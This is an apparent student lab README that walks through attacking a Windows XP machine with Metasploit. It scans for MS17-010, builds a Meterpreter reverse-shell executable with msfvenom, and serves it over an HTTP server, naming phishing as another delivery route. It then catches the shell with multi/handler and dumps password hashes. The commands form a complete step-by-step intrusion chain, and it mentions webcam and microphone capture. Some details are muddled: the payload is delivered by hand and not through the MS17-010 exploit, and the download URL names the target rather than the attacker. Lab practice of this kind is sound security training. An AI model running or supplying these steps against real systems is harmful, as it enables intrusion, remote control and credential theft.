# METASPLOIT

## 1. What is METASPLOIT?
Metasploit is a security tool used for penetration testing, information gathering, scanning, exploiting vulnerabilities, etc. Metasploit is available on most Kali machines, if not you can install it by following [this](https://help.rapid7.com/metasploit/Content/installation-and-updates/installing-msf.html)

## 2. OBJECTIVE.
This project aims to identify vulnerabilities, exploit vulnerabilities, and gain credential hashes using Metasploit.

## 3. IDENTIFYING A VULNERABILITY IN A WINDOWS MACHINE.
### Prerequisites
- Kali Linux machine.
- A Windows machine with the MS17_010 vulnerability(eg. Windows XP)
### STEP1
Start Metasploit by typing **msfconsole** in the command prompt of your Kali machine.
```
msfconsole
```
### STEP2
The target vulnerability is the MS17_010 which allows remote code execution on a Windows Server Message Block(SMB) server. Several SMB vulnerabilities can be exploited by attackers for malicious purposes. You can explore the various vulnerabilities using the command:
```
search module smb
```
### STEP3
For this project, we are exploiting the MS17_010 vulnerability, so go through the numerous vulnerabilities and select the one below:

![Kali-Linux-2024  Running  - Oracle VM VirtualBox 07_03_2025 14_28_42](https://github.com/user-attachments/assets/e51aa712-4e59-4a69-8915-0883e474f5fc)
#### For further information on this vulnerability, run:
```
search module auxiliary/scanner/smb/smb_ms17_010
```
#### Then use the selected vulnerability:
```
use auxiliary/scanner/smb/smb_ms17_010
```
### STEP4
Select the remote host to test the vulnerability(ie. Windows XP machine)
```
set RHOSTS <target machine IP address>
```
### STEP5
Test for the vulnerability:
```
run
```

## 4. EXPLOITING THE VULNERABILITY.
For this exploitation, we are going to use a Materpreter reverse shell payload. From this payload we gain a reverse connection from the target machine to the attacker machine, giving the attacker machine elevated privileges to run any command.
### STEP 1
Use Metaspoilt to generate the payload. The payload is a malicious code that exploits a vulnerability when run on a vulnerable machine.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST =<attacker IP> LPORT=<port number> -f exe -o reverse_shell_32.exe
```
### STEP 2
Transfer the generated payload to the target machine. There are several ways to transfer the payload. Eg. File Sharing, Email Phishing, HTTP Server etc.
I used the HTTP Server method, by setting up an HTTP server on the attacker machine:
```
python3 -m http.server 8080
```
Then on the target machine, I open a browser and type in the address of the attacker machine, **http:<target_machine_IP>:8080**
Depending on the machine, there is a download request for the payload or you access the files on the attacker machine and manually download the payload to the target machine.

### STEP 3
Start the Metasploit console.
```
msfconsole
```
Then set a listener to listen for incoming connections, the listener is the attacker machine
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set LHOST <attacker_IP>
set LPORT <port_number>
exploit
```
### STEP 4
Execute the payload on the target machine. This initiates a reverse connection to the attacker's listener and sets a meterpreter session up. Giving the attacker machine escalated privileges over the target machine.
Through the meterpreter session, the attacker machine can dump password hashes, gain system-level privileges, and capture webcam and microphones on the target machine.

## CREDENTIAL HASHES
From the meterpreter session, you can get the hashed value of the administrator's password and others in the database using the command
```
hashdump
```
## HAPPY LEARNING !!!










  
